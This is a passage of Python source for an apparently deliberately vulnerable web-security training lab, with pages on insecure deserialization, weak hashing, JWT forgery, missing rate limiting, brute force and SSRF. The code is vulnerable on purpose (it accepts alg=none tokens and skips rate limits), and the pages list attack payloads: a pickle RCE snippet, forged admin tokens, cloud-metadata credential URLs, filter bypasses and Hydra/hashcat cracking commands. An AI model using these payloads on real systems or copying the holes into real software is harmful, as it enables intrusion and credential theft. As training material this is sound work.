                    decoded=base64.b64decode(payload).decode(); data=json.loads(decoded)
                    if isinstance(data,dict) and "username" in data:
                        if data.get("role") not in ["user"]: msg='<div class="err">Privilege escalation attempt blocked</div>'
                        else: msg=f'<div class="out">Session accepted: {html.escape(json.dumps(data))}</div>'
                    else: msg='<div class="err">Invalid session format</div>'
                except: msg='<div class="err">Invalid session data</div>'
    safe=base64.b64encode(json.dumps({"username":"gordonb","role":"user"}).encode()).decode()
    tampered=base64.b64encode(json.dumps({"username":"admin","role":"admin"}).encode()).decode()
    rce=base64.b64encode(b'{"__class__":"os.system","cmd":"id"}').decode()
    expired=base64.b64encode(json.dumps({"username":"admin","role":"user","exp":1}).encode()).decode()
    pl=[
        ("Normal session","Valid user session token — accepted by server",safe),
        ("Role elevation to admin","Tamper role field from user to admin — privilege escalation",tampered),
        ("RCE simulation payload","Simulate pickle-style RCE gadget chain",rce),
        ("Expired token","Manipulate expiry field to an old timestamp",expired),
        ("Username to admin","Change username field without knowing admin password",base64.b64encode(json.dumps({"username":"admin","role":"user"}).encode()).decode()),
        ("Extra privilege field","Inject new privilege field not expected by app",base64.b64encode(json.dumps({"username":"gordonb","role":"user","is_admin":True,"superuser":1}).encode()).decode()),
    ]
    ph='<div class="stitle">Session Payloads (click to fill)</div>'+"".join(pcard(t,d,p,"deser-input") for t,d,p in pl)
    pickle_rce="import pickle,os,base64\n\nclass Exploit(object):\n    def __reduce__(self):\n        return (os.system, ('id',))\n\npayload = base64.b64encode(pickle.dumps(Exploit())).decode()\nprint(payload)\n# Send as cookie: session=<payload>"
    return base_page("Insecure Deser",f"""
<div class="ph"><h2>Insecure Deserialization</h2><p>Exploit unsafe object deserialization to achieve RCE, session tampering, or privilege escalation without authentication.</p></div>
<div class="g2">
<div>
<div class="card"><h3>Session Token <span class="lbadge" style="font-size:11px">{lv}</span></h3>
<form method="POST"><label>Base64 Session Data</label><textarea name="payload" id="deser-input" rows="3">{html.escape(safe)}</textarea><button class="btn btn-d" type="submit">Submit</button></form>{msg}</div>
<div class="card"><h3>Payloads</h3>{ph}</div>
</div>
<div>
<div class="ibox"><h4>How Insecure Deserialization Works</h4>
<p>When servers deserialize untrusted data, attackers inject objects that trigger dangerous code paths. Python <code>pickle</code>, Java <code>ObjectInputStream</code>, PHP <code>unserialize()</code> can execute arbitrary code.</p>
<div class="step"><div class="snum">1</div><div class="stxt">Identify serialized tokens in cookies, POST bodies, headers (base64/hex)</div></div>
<div class="step"><div class="snum">2</div><div class="stxt">Decode and inspect — look for class names, role fields, privilege flags</div></div>
<div class="step"><div class="snum">3</div><div class="stxt">Tamper values (role, username) and re-encode</div></div>
<div class="step"><div class="snum">4</div><div class="stxt">For pickle/Java: craft gadget chain for RCE</div></div>
</div>
<div class="ibox"><h4>Python Pickle RCE</h4>
<div class="out" style="font-size:11px">{html.escape(pickle_rce)}</div></div>
<div class="ibox"><h4>Defense</h4><ul>
<li>Never deserialize untrusted data with pickle/Java serialization</li>
<li>Use JSON with strict schema validation (jsonschema)</li>
<li>Sign tokens with HMAC: use JWT or itsdangerous library</li>
<li>Run deserializers in sandboxed/isolated environment</li>
</ul></div>
</div></div>""","insecure-deser")

def page_weak_crypto(params,method="GET",body_params=None):
    msg=""
    if method=="POST" and body_params:
        text=body_params.get("text",[""])[0]
        if text:
            results={
                "MD5 [BROKEN]": hashlib.md5(text.encode()).hexdigest(),
                "SHA1 [WEAK]": hashlib.sha1(text.encode()).hexdigest(),
                "SHA256 [OK — needs salt]": hashlib.sha256(text.encode()).hexdigest(),
                "SHA512 [BETTER]": hashlib.sha512(text.encode()).hexdigest(),
                "MD5 + salt 'dvwa'": hashlib.md5(("dvwa"+text).encode()).hexdigest(),
                "Base64 [NOT CRYPTO]": base64.b64encode(text.encode()).decode(),
                "ROT13 [TRIVIAL]": text.translate(str.maketrans('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz','NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm')),
                "XOR key=0x41 [hex]": bytes([b^0x41 for b in text.encode()]).hex(),
            }
            rows="".join(f'<tr><td style="font-size:12px;color:#e3b341">{k}</td><td style="font-family:monospace;font-size:11px;word-break:break-all">{v}</td></tr>' for k,v in results.items())
            msg=f'<table><thead><tr><th>Algorithm</th><th>Output</th></tr></thead><tbody>{rows}</tbody></table>'
    known=[
        ("5f4dcc3b5aa765d61d8327deb882cf99","password","MD5"),
        ("e99a18c428cb38d5f260853678922e03","abc123","MD5"),
        ("0d107d09f5bbe40cade3de5c71e9e9b7","letmein","MD5"),
        ("8d3533d75ae2c3966d7e0d4fcc69216b","1337","MD5"),
        ("482c811da5d5b4bc6d497ffa98491e38","password123","MD5"),
        ("d8578edf8458ce06fbc5bb76a58c5ca4","qwerty","MD5"),
    ]
    hrows="".join(f'<tr><td style="font-family:monospace;font-size:11px">{h}</td><td><code>{p}</code></td><td style="color:#8b949e">{a}</td></tr>' for h,p,a in known)
    pl=[
        ("Hashcat MD5 crack","Crack MD5 with rockyou — GPU does 164B/sec","hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt"),
        ("Hashcat SHA1","Crack SHA1 hashes","hashcat -m 100 hashes.txt rockyou.txt"),
        ("Hashcat SHA256","Crack unsalted SHA256","hashcat -m 1400 hashes.txt rockyou.txt"),
        ("Hashcat with rules","Augment wordlist with mangling rules","hashcat -m 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule"),
        ("John the Ripper","Auto-detect hash type and crack","john --wordlist=rockyou.txt hashes.txt"),
        ("John show results","Show cracked passwords from John session","john --show hashes.txt"),
        ("Base64 decode","Decode base64-encoded 'secret'","echo 'dGVzdA==' | base64 -d"),
        ("CrackStation online","Rainbow table lookup — instant results for common passwords","https://crackstation.net/"),
        ("Hash identifier","Identify unknown hash algorithm","hash-identifier <hash>  OR  hashid <hash>"),
        ("Custom salt crack","If salt is known — prepend and crack","hashcat -m 0 hash.txt wordlist.txt --username"),
    ]
    ph='<div class="stitle">Cracking Commands</div>'+"".join(pcard(t,d,p) for t,d,p in pl)
    return base_page("Weak Crypto",f"""
<div class="ph"><h2>Weak Cryptography</h2><p>Identify and exploit weak hashing algorithms, improper encoding, and cryptographic anti-patterns used in real applications.</p></div>
<div class="g2">
<div>
<div class="card"><h3>Hash Generator</h3>
<form method="POST"><label>Plaintext to Hash</label><input type="text" name="text" placeholder="password123"><button class="btn btn-i" type="submit">Hash It</button></form>{msg}</div>
<div class="card"><h3>Known DB Hashes (crack these)</h3>
<table><thead><tr><th>Hash</th><th>Plaintext</th><th>Algo</th></tr></thead><tbody>{hrows}</tbody></table>
<div class="hint" style="margin-top:.75rem">Crack: <code>hashcat -m 0 hashes.txt rockyou.txt</code></div></div>
<div class="card"><h3>Cracking Tools</h3><div style="max-height:320px;overflow-y:auto">{ph}</div></div>
</div>
<div>
<div class="ibox"><h4>Algorithm Ratings</h4><ul>
<li><span class="vtag">BROKEN</span> <strong>MD5</strong> — 164 billion/sec on RTX 4090, known collision attacks</li>
<li><span class="vtag">BROKEN</span> <strong>SHA1</strong> — SHAttered collision (2017), GPU-crackable</li>
<li><span class="vtag">WEAK</span> <strong>SHA256/512 unsalted</strong> — fast hash, rainbow tables work</li>
<li><span class="itag">OK</span> <strong>SHA256 + unique salt</strong> — defeats rainbow tables but still fast</li>
<li><span class="stag">GOOD</span> <strong>bcrypt</strong> — slow by design, built-in salt, cost factor</li>
<li><span class="stag">BEST</span> <strong>Argon2id</strong> — memory-hard, GPU-resistant, OWASP recommended</li>
<li><span class="vtag">NOT CRYPTO</span> <strong>Base64 / ROT13 / XOR</strong> — trivially reversible encoding</li>
</ul></div>
<div class="ibox"><h4>GPU Cracking Speeds (RTX 4090)</h4><ul>
<li>MD5: ~164 billion hashes/second</li>
<li>SHA1: ~60 billion hashes/second</li>
<li>SHA256: ~22 billion hashes/second</li>
<li>bcrypt (cost 12): ~184,000 hashes/second</li>
<li>Argon2id: dramatically slower — minutes per hash</li>
<li>14M rockyou passwords cracked in &lt;1ms for MD5</li>
</ul></div>
<div class="ibox"><h4>Defense</h4><ul>
<li>Use bcrypt: <code>import bcrypt; bcrypt.hashpw(pw, bcrypt.gensalt(rounds=12))</code></li>
<li>Or Argon2: <code>from argon2 import PasswordHasher; ph=PasswordHasher()</code></li>
<li>Never use MD5/SHA1 for passwords</li>
<li>Base64 is NOT encryption — never store secrets in it</li>
</ul></div>
</div></div>""","weak-crypto")


def page_jwt(params,method="GET",body_params=None):
    msg=""
    def mk(payload_dict,secret="secret123"):
        hdr=base64.urlsafe_b64encode(json.dumps({"alg":"HS256","typ":"JWT"}).encode()).rstrip(b'=').decode()
        bod=base64.urlsafe_b64encode(json.dumps(payload_dict).encode()).rstrip(b'=').decode()
        sig=base64.urlsafe_b64encode(hmac.new(secret.encode(),f"{hdr}.{bod}".encode(),hashlib.sha256).digest()).rstrip(b'=').decode()
        return f"{hdr}.{bod}.{sig}"
    sample=mk({"username":"gordonb","role":"user","exp":9999999999})
    ahdr=base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b'=').decode()
    abod=base64.urlsafe_b64encode(json.dumps({"username":"admin","role":"admin","exp":9999999999}).encode()).rstrip(b'=').decode()
    none_tok=f"{ahdr}.{abod}."
    weak_tok=mk({"username":"gordonb","role":"user","exp":9999999999},"password")
    admin_weak=mk({"username":"admin","role":"admin","exp":9999999999},"password")
    if method=="POST" and body_params:
        token=body_params.get("token",[""])[0]
        if token:
            try:
                parts=token.split(".")
                if len(parts)==3:
                    hdr=json.loads(base64.urlsafe_b64decode(parts[0]+"=="))
                    bod=json.loads(base64.urlsafe_b64decode(parts[1]+"=="))
                    alg=hdr.get("alg","").lower()
                    if alg=="none":
                        msg=f'<div class="flag">ALG=NONE BYPASS!\nSignature skipped — token accepted without verification!\nUsername: {html.escape(str(bod.get("username")))} Role: {html.escape(str(bod.get("role")))}\nFLAG{{jwt_none_alg_bypass}}</div>'
                    elif alg=="hs256":
                        found=False
                        for sec in ["secret123","password","admin","secret","jwt_secret","dvwa","1234","changeme"]:
                            sc=base64.urlsafe_b64encode(hmac.new(sec.encode(),f"{parts[0]}.{parts[1]}".encode(),hashlib.sha256).digest()).rstrip(b'=').decode()
                            if sc==parts[2]:
                                msg=f'<div class="flag">Valid JWT (secret: <code>{sec}</code>)\nUser: {html.escape(str(bod.get("username")))} Role: {html.escape(str(bod.get("role")))}</div>'
                                if bod.get("role")=="admin": msg+='<div class="flag">ADMIN ACCESS! FLAG{jwt_weak_secret_cracked}</div>'
                                found=True; break
                        if not found: msg='<div class="err">Invalid signature. Use: <code>hashcat -m 16500 token.txt rockyou.txt</code></div>'
                    else: msg=f'<div class="out">Alg: {html.escape(alg)} | Claims: {html.escape(json.dumps(bod))}</div>'
                else: msg='<div class="err">Invalid JWT format (need header.payload.signature)</div>'
            except Exception as e: msg=f'<div class="err">Parse error: {html.escape(str(e))}</div>'
    pl=[
        ("Normal user token (HS256)","Valid token signed with secret123 — role=user",sample),
        ("alg=none attack","Remove signature entirely — server must accept unsigned token",none_tok),
        ("Weak secret (password)","Signed with weak secret 'password' — crack with hashcat",weak_tok),
        ("Admin + weak secret","Admin token signed with crackable secret",admin_weak),
        ("Modified none token","Manually crafted unsigned admin token",none_tok),
        ("Expired token","Test token with past exp — server should reject","eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiZXhwIjoxfQ."),
    ]
    ph='<div class="stitle">JWT Attack Tokens (click to fill)</div>'+"".join(pcard(t,d,p,"jwt-input") for t,d,p in pl)
    return base_page("JWT Attacks",f"""
<div class="ph"><h2>JWT Attacks</h2><p>Forge, tamper, and exploit JSON Web Tokens to bypass authentication and escalate privileges.</p></div>
<div class="g2">
<div>
<div class="card"><h3>JWT Verifier</h3>
<p style="font-size:13px;color:#8b949e">Weak secret: <code>secret123</code> — try alg=none bypass and weak secret cracking</p>
<form method="POST"><label>JWT Token</label><textarea name="token" id="jwt-input" rows="4">{html.escape(sample)}</textarea><button class="btn btn-d" type="submit">Verify</button></form>{msg}</div>
<div class="card"><h3>Attack Tokens</h3>{ph}</div>
</div>
<div>
<div class="ibox"><h4>JWT Structure</h4>
<div class="out" style="font-size:11px">HEADER.PAYLOAD.SIGNATURE

Header:  base64url({{"alg":"HS256","typ":"JWT"}})
Payload: base64url({{"username":"admin","role":"admin"}})
Sig:     HMAC-SHA256(header+"."+payload, secret)</div></div>
<div class="ibox"><h4>Attack Types</h4><ul>
<li><span class="vtag">alg=none</span> Set algorithm to "none" — remove signature — server accepts unsigned token</li>
<li><span class="vtag">Weak Secret</span> Brute-force HMAC key: <code>hashcat -m 16500 token.txt rockyou.txt</code></li>
<li><span class="vtag">RS256→HS256</span> Give server its own RSA public key as HMAC secret</li>
<li><span class="vtag">kid injection</span> SQL/path injection in the <code>kid</code> header field</li>
<li><span class="vtag">JWK injection</span> Embed attacker public key in token header</li>
<li><span class="vtag">Claim tampering</span> Change role/exp/permissions after obtaining a valid token</li>
<li><span class="vtag">Null signature</span> Empty string as signature — some libs accept it</li>
</ul></div>
<div class="ibox"><h4>Cracking Tools</h4><ul>
<li><code>hashcat -m 16500 jwt.txt rockyou.txt</code></li>
<li><code>python3 jwt_tool.py TOKEN -C -d rockyou.txt</code></li>
<li>Burp Suite JWT Editor extension — visual tamper + resign</li>
<li>jwt.io — decode and inspect tokens interactively</li>
</ul></div>
<div class="ibox"><h4>Defense</h4><ul>
<li>Always verify signature server-side — never skip it</li>
<li>Explicitly reject <code>alg=none</code> tokens</li>
<li>Use strong random secrets (256+ random bits)</li>
<li>Prefer RS256 (asymmetric) — private key signs, public key verifies</li>
<li>Short token expiry + refresh token rotation</li>
<li>Validate all claims (exp, iss, aud) on every request</li>
</ul></div>
</div></div>""","jwt")

def page_rate_limit(params,method="GET",body_params=None):
    lv=SECURITY_LEVEL["level"]; msg=""
    if method=="POST" and body_params:
        user=body_params.get("username",[""])[0]; pw=body_params.get("password",[""])[0]
        now=time.time(); key=f"127.0.0.1:{user}"
        if lv=="low":
            msg='<div class="flag">Login SUCCESS! FLAG{rate_limit_bypassed}</div>' if (user=="admin" and pw=="password") else '<div class="err">Invalid — no rate limit! Keep guessing...</div>'
        else:
            if key not in RATE_LIMIT_STORE: RATE_LIMIT_STORE[key]={"count":0,"window":now}
            st=RATE_LIMIT_STORE[key]
            if now-st["window"]>60: st["count"]=0; st["window"]=now
            st["count"]+=1; rem=max(0,5-st["count"])
            if st["count"]>5: msg=f'<div class="err">Rate limited! Wait {int(60-(now-st["window"]))}s before retrying.</div>'
            elif user=="admin" and pw=="password": msg=f'<div class="flag">Login OK! ({rem} attempts left this window)</div>'
            else: msg=f'<div class="err">Invalid credentials. ({rem} attempts before lockout)</div>'
    pl=[
        ("Hydra HTTP POST form","Brute-force web login form — most common tool","hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 http-post-form '/rate-limit:username=^USER^&password=^PASS^:Invalid' -t 4"),
        ("Hydra SSH","Brute-force SSH credentials","hydra -l root -P rockyou.txt ssh://192.168.1.100"),
        ("Burp Intruder","Use Sniper mode on password field — grep for SUCCESS response","Intruder → Sniper → payload=Simple List → grep match 'SUCCESS'"),
        ("wfuzz","Fast web fuzzer for credential brute-force","wfuzz -c -z file,rockyou.txt --hh 0 -d 'username=admin&password=FUZZ' http://127.0.0.1:8888/rate-limit"),
        ("ffuf","Modern fast fuzzer","ffuf -w rockyou.txt -X POST -d 'username=admin&password=FUZZ' -u http://127.0.0.1:8888/rate-limit -fs 0"),
        ("Medusa","Multi-protocol brute forcer","medusa -h 127.0.0.1 -u admin -P rockyou.txt -M http -m 'POST:/rate-limit:username=^USER^&password=^PASS^:Invalid'"),
        ("Python requests loop","Simple brute-force script using requests library","import requests\nfor pw in open('rockyou.txt').read().splitlines():\n    r=requests.post('http://127.0.0.1:8888/rate-limit',data={'username':'admin','password':pw})\n    if 'SUCCESS' in r.text:\n        print(f'Found: {pw}'); break"),
        ("Password spray","Try one password against all usernames — avoid lockout","for user in users.txt: try 'Summer2024!' once per account"),
    ]
    ph='<div class="stitle">Brute Force Tools & Commands</div>'+"".join(pcard(t,d,p) for t,d,p in pl)
    return base_page("Rate Limiting",f"""
<div class="ph"><h2>Missing Rate Limiting</h2><p>Brute-force credentials against endpoints with no lockout, rate limiting, or CAPTCHA protection.</p></div>
<div class="g2">
<div>
<div class="card"><h3>Login (No Rate Limit) <span class="lbadge" style="font-size:11px">{lv}</span></h3>
<p style="font-size:13px;color:#8b949e">Hint: username=<code>admin</code>, password is in rockyou.txt</p>
<form method="POST"><label>Username</label><input type="text" name="username" value="admin"><label>Password</label><input type="password" name="password" placeholder="password, admin, 123456..."><button class="btn btn-d" type="submit">Login</button></form>{msg}</div>
<div class="card"><h3>Attack Tools</h3><div style="max-height:420px;overflow-y:auto">{ph}</div></div>
</div>
<div>
<div class="ibox"><h4>How Brute Force Works</h4>
<p>Without rate limiting, an attacker submits thousands of login attempts per second. Against rockyou.txt (14M passwords), most accounts are cracked in seconds to minutes on a fast connection.</p>
<div class="step"><div class="snum">1</div><div class="stxt">Identify login endpoint and its POST parameters</div></div>
<div class="step"><div class="snum">2</div><div class="stxt">Choose wordlist (rockyou.txt, SecLists/Passwords/)</div></div>
<div class="step"><div class="snum">3</div><div class="stxt">Run Hydra/Burp to automate thousands of attempts</div></div>
<div class="step"><div class="snum">4</div><div class="stxt">Detect success via response length, status code, or body text</div></div>
</div>
<div class="ibox"><h4>Defense</h4><ul>
<li>Rate limit: max 5 attempts per IP per minute</li>
<li>Account lockout after 10 failures (with unlock flow)</li>
<li>CAPTCHA after 3 consecutive failures</li>
<li>Multi-factor authentication (MFA)</li>
<li>Exponential backoff — doubles wait time on each failure</li>
<li>Check passwords against HaveIBeenPwned API on registration</li>
<li>Anomaly detection — alert on unusual login volume</li>
</ul></div>
</div></div>""","rate-limit")


def page_bruteforce(params,method="GET",body_params=None):
    msg=""; result_table=""
    WL=["password","admin","123456","qwerty","letmein","12345","password123","admin123",
        "root","toor","test","guest","master","dragon","baseball","iloveyou","monkey",
        "shadow","sunshine","princess","welcome","login","abc123","pass","hello",
        "charlie","donald","1234","aa123456","changeme","password1","admin1234","secret"]
    if method=="POST" and body_params:
        tu=body_params.get("target_user",["admin"])[0]
        at=body_params.get("attack_type",["wordlist"])[0]
        cw=[w.strip() for w in body_params.get("custom_words",[""])[0].strip().split("\n") if w.strip()]
        wl=cw if (at=="custom" and cw) else WL
        conn=sqlite3.connect(DB_PATH); c=conn.cursor()
        c.execute("SELECT username,password FROM users WHERE username=?",(tu,)); row=c.fetchone(); conn.close()
        if row:
            ah=row[1]; found=None; attempts=[]
            for pw in wl[:60]:
                ph=hashlib.md5(pw.encode()).hexdigest(); hit=(ph==ah)
                attempts.append((pw,ph,hit))
                if hit: found=pw; break
            def tr(p,h,hit):
                if hit: return f'<tr><td style="font-family:monospace;color:#7ee787">{html.escape(p)}</td><td style="font-family:monospace;font-size:11px;color:#7ee787">{h}</td><td style="color:#7ee787;font-weight:700">MATCH!</td></tr>'
                return f'<tr><td style="font-family:monospace;color:#8b949e">{html.escape(p)}</td><td style="font-family:monospace;font-size:11px;color:#8b949e">{h}</td><td style="color:#8b949e">no</td></tr>'
            result_table=f'<table style="margin-top:.75rem"><thead><tr><th>Password tried</th><th>MD5 hash</th><th>Result</th></tr></thead><tbody>{"".join(tr(p,h,hi) for p,h,hi in attempts)}</tbody></table>'
            msg=f'<div class="flag">PASSWORD CRACKED for {html.escape(tu)}: <strong>{html.escape(found)}</strong>\nMD5: {hashlib.md5(found.encode()).hexdigest()}</div>' if found else f'<div class="err">Not found in {len(wl[:60])}-entry list. Use rockyou.txt for real coverage.</div>'
        else: msg=f'<div class="err">User not found: {html.escape(tu)}</div>'
    return base_page("Brute Force",f"""
<div class="ph"><h2>Brute Force — Credential Cracking Lab</h2><p>Simulate offline hash cracking and online credential brute-force. Learn hashcat, Hydra, and custom scripts.</p></div>
<div class="g2">
<div>
<div class="card"><h3>Offline Hash Cracker</h3>
<p style="font-size:13px;color:#8b949e">Crack MD5 hashes from this app's database. Users: admin, gordonb, 1337, pablo, smithy, alice</p>
<form method="POST">
<label>Target Username</label>
<select name="target_user"><option value="admin">admin</option><option value="gordonb">gordonb</option><option value="1337">1337</option><option value="pablo">pablo</option><option value="smithy">smithy</option><option value="alice">alice</option></select>
<label>Attack Type</label>
<select name="attack_type"><option value="wordlist">Built-in wordlist (32 passwords)</option><option value="custom">Custom wordlist (enter below)</option></select>
<label>Custom Wordlist (one per line)</label>
<textarea name="custom_words" rows="4" placeholder="password&#10;admin&#10;123456"></textarea>
<button class="btn btn-d" type="submit">Launch Attack</button></form>
{msg}{result_table}</div>
</div>
<div>
<div class="ibox"><h4>Attack Types Explained</h4><ul>
<li><strong style="color:#f0f6fc">Dictionary</strong> — try every password in a wordlist (rockyou: 14M entries)</li>
<li><strong style="color:#f0f6fc">Rule-based</strong> — transform words: <code>password → P@ssw0rd, Password1!</code></li>
<li><strong style="color:#f0f6fc">Brute force</strong> — try all combinations of charset/length (slow but complete)</li>
<li><strong style="color:#f0f6fc">Rainbow tables</strong> — pre-computed hash lookups (defeated by salting)</li>
<li><strong style="color:#f0f6fc">Credential stuffing</strong> — replay leaked username/password pairs from breaches</li>
<li><strong style="color:#f0f6fc">Password spraying</strong> — try 1 common password against many usernames</li>
<li><strong style="color:#f0f6fc">Hybrid</strong> — wordlist + char appending (<code>password1</code>, <code>password!</code>)</li>
</ul></div>
<div class="ibox"><h4>Hashcat Reference</h4>
<div class="pbox"><div class="ptitle">MD5 dictionary attack</div><div class="pdesc">Crack MD5 hashes using rockyou.txt wordlist</div><code>hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt</code></div>
<div class="pbox"><div class="ptitle">SHA1 crack</div><div class="pdesc">Mode 100 for SHA1 hash format</div><code>hashcat -m 100 hashes.txt rockyou.txt</code></div>
<div class="pbox"><div class="ptitle">Brute force 6-char alphanumeric</div><div class="pdesc">Try all ?a (any printable) 6-character combinations</div><code>hashcat -m 0 hashes.txt -a 3 ?a?a?a?a?a?a</code></div>
<div class="pbox"><div class="ptitle">Hybrid — append 1-4 digits</div><div class="pdesc">Append digits to every wordlist entry</div><code>hashcat -m 0 hashes.txt -a 6 rockyou.txt ?d?d?d?d</code></div>
<div class="pbox"><div class="ptitle">With rules (best64)</div><div class="pdesc">Apply best64 transformation rules to wordlist</div><code>hashcat -m 0 hashes.txt rockyou.txt -r best64.rule</code></div>
<div class="pbox"><div class="ptitle">Show cracked passwords</div><div class="pdesc">Display previously cracked results from potfile</div><code>hashcat -m 0 hashes.txt --show</code></div>
</div>
<div class="ibox"><h4>Online Attack Tools</h4>
<div class="pbox"><div class="ptitle">Hydra — HTTP POST login</div><div class="pdesc">Brute-force web login forms — most flexible tool</div><code>hydra -l admin -P rockyou.txt 127.0.0.1 http-post-form "/auth-bypass:username=^USER^&password=^PASS^:Invalid" -t 10</code></div>
<div class="pbox"><div class="ptitle">Hydra — SSH brute force</div><div class="pdesc">Brute-force SSH service</div><code>hydra -l root -P rockyou.txt ssh://192.168.1.100 -t 4</code></div>
<div class="pbox"><div class="ptitle">Hydra — FTP</div><div class="pdesc">Brute-force FTP credentials</div><code>hydra -L users.txt -P rockyou.txt ftp://192.168.1.100</code></div>
<div class="pbox"><div class="ptitle">CrackMapExec — SMB spray</div><div class="pdesc">Password spray against Active Directory SMB</div><code>crackmapexec smb 192.168.1.0/24 -u users.txt -p rockyou.txt --no-bruteforce</code></div>
<div class="pbox"><div class="ptitle">Medusa — multi-service</div><div class="pdesc">Parallel brute force for many protocols</div><code>medusa -h 192.168.1.100 -u admin -P rockyou.txt -M http</code></div>
</div>
<div class="ibox"><h4>John the Ripper</h4>
<div class="pbox"><div class="ptitle">Auto-detect and crack</div><div class="pdesc">John auto-identifies hash format from file</div><code>john --wordlist=rockyou.txt hashes.txt</code></div>
<div class="pbox"><div class="ptitle">Show results</div><div class="pdesc">Display cracked passwords after session</div><code>john --show hashes.txt</code></div>
<div class="pbox"><div class="ptitle">Incremental (true brute force)</div><div class="pdesc">Try all combinations — very slow but thorough</div><code>john --incremental hashes.txt</code></div>
</div>
</div></div>""","bruteforce")

def page_ssrf(params,method="GET",body_params=None):
    lv=SECURITY_LEVEL["level"]
    url=(body_params or params).get("url",[""])[0]; msg=""
    if url:
        if lv=="low":
            sims={"169.254.169.254":'{"instance-type":"t2.micro","iam":{"role":"EC2Role"},"secret":"FLAG{ssrf_cloud_metadata}","db_password":"supersecret123"}',"localhost":"HTTP/1.1 200 OK\nAdmin panel on localhost — not meant to be public\nFLAG{ssrf_localhost_access}","127.0.0.1":"HTTP/1.1 200 OK\n[Internal admin interface]","redis":"+PONG\r\n[Redis accessible via SSRF]","internal":"HTTP/1.1 200 OK\n[Internal service response]"}
            sim=next((v for k,v in sims.items() if k in url),f"[Simulated response from {url}]")
            if any(x in url for x in ["169.254","localhost","127.","0.0.0.0","internal","redis","::1"]): msg=f'<div class="flag">SSRF! Server fetched: {html.escape(url)}\n\n{html.escape(sim)}</div>'
            else: msg=f'<div class="out">External URL fetched: {html.escape(url)}\n[Simulated response]</div>'
        elif lv=="medium":
            blocked=["169.254","10.","192.168.","172.16.","127.","localhost","0.0.0.0","::1"]
            if any(b in url for b in blocked): msg='<div class="err">Blocked: private IP ranges filtered. Try: 0177.0.0.1 or 2130706433 or DNS rebinding.</div>'
            else: msg=f'<div class="out">External fetch: {html.escape(url)}</div>'
        else:
            if any(url.startswith(a) for a in ["https://example.com","https://api.github.com"]): msg=f'<div class="out">Allowlisted URL: {html.escape(url)}</div>'
            else: msg='<div class="err">URL not in allowlist</div>'
    pl=[
        ("AWS EC2 metadata","Steal IAM role credentials — used in real cloud breaches","http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
        ("AWS user-data","Read EC2 user-data — often contains secrets/scripts","http://169.254.169.254/latest/user-data"),
        ("GCP metadata","Google Cloud instance metadata + service account tokens","http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/"),
        ("Azure IMDS","Azure Instance Metadata Service — access tokens","http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
        ("Localhost admin panel","Access admin interface only available on localhost","http://localhost:8080/admin"),
        ("Internal network scan","Probe internal RFC1918 IP ranges","http://192.168.1.1/"),
        ("Redis SSRF","Access Redis without authentication via HTTP","http://localhost:6379/"),
        ("Kubernetes API","Access k8s API server from inside a pod","https://kubernetes.default.svc/api/v1/namespaces/"),
        ("Internal Consul","Read Consul key-value store — service credentials","http://localhost:8500/v1/kv/?recurse"),
        ("file:// protocol","Read local files via file protocol (if allowed)","file:///etc/passwd"),
        ("Decimal IP bypass","127.0.0.1 in decimal notation — bypass dotted-IP filter","http://2130706433/"),
        ("Octal IP bypass","127.0.0.1 in octal — bypass numeric IP filter","http://0177.0.0.1/"),
        ("IPv6 loopback","IPv4 filter bypass using IPv6 loopback address","http://[::1]/admin"),
        ("DNS rebinding","Domain resolving to 127.0.0.1 — bypass hostname check","http://localtest.me/"),
    ]
    ph='<div class="stitle">SSRF Payloads (click to fill)</div>'+"".join(pcard(t,d,p,"ssrf-input") for t,d,p in pl)
    return base_page("SSRF",f"""
<div class="ph"><h2>SSRF — Server-Side Request Forgery</h2><p>Force the server to make HTTP requests to internal or cloud metadata services, pivoting through its network trust.</p></div>
<div class="g2">
<div>
<div class="card"><h3>URL Fetcher <span class="lbadge" style="font-size:11px">{lv}</span></h3>
<form method="GET"><label>URL to Fetch</label><input type="text" name="url" id="ssrf-input" value="{html.escape(url)}" placeholder="http://169.254.169.254/latest/meta-data/"><button class="btn btn-d" type="submit">Fetch</button></form>{msg}</div>
<div class="card"><h3>SSRF Payloads</h3><div style="max-height:460px;overflow-y:auto">{ph}</div></div>
</div>
<div>
<div class="ibox"><h4>How SSRF Works</h4>
<p>When a server fetches URLs on behalf of users without validating the target, attackers supply internal URLs to reach services not accessible from the internet.</p>
<div class="step"><div class="snum">1</div><div class="stxt">Find URL-fetching feature — webhook URL, image URL, PDF generator</div></div>
<div class="step"><div class="snum">2</div><div class="stxt">Test cloud metadata: <code>http://169.254.169.254/latest/meta-data/</code></div></div>
<div class="step"><div class="snum">3</div><div class="stxt">Steal IAM credentials/tokens from cloud metadata</div></div>
<div class="step"><div class="snum">4</div><div class="stxt">Scan internal network for Redis, Elasticsearch, internal APIs</div></div>
<div class="step"><div class="snum">5</div><div class="stxt">Chain with other vulns — SSRF + Redis = RCE</div></div>
</div>
<div class="ibox"><h4>High-Value SSRF Targets</h4><ul>
<li>AWS: <code>169.254.169.254/latest/meta-data/iam/security-credentials/</code></li>
<li>GCP: <code>metadata.google.internal/computeMetadata/v1/project/</code></li>
<li>Kubernetes: <code>kubernetes.default.svc/api/v1/secrets/</code></li>
<li>Internal Redis: <code>localhost:6379</code> — unauthenticated, can set arbitrary keys</li>
</ul></div>
<div class="ibox"><h4>Defense</h4><ul>
<li>Allowlist permitted URL schemes and domains</li>
<li>Block all RFC1918 private ranges and loopback</li>
<li>Resolve hostname and validate resolved IP (prevent DNS rebinding)</li>
<li>Disable unnecessary URL scheme handlers (file://, gopher://, dict://)</li>
<li>Separate network segment for URL-fetching services</li>
</ul></div>
</div></div>""","ssrf")

def page_clickjacking(params):
    return base_page("Clickjacking","""
<div class="ph"><h2>Clickjacking</h2><p>Trick users into clicking hidden UI elements by overlaying a transparent iframe of a trusted site over a decoy page.</p></div>
<div class="g2">
<div>
<div class="card"><h3>Clickjacking Demo</h3>
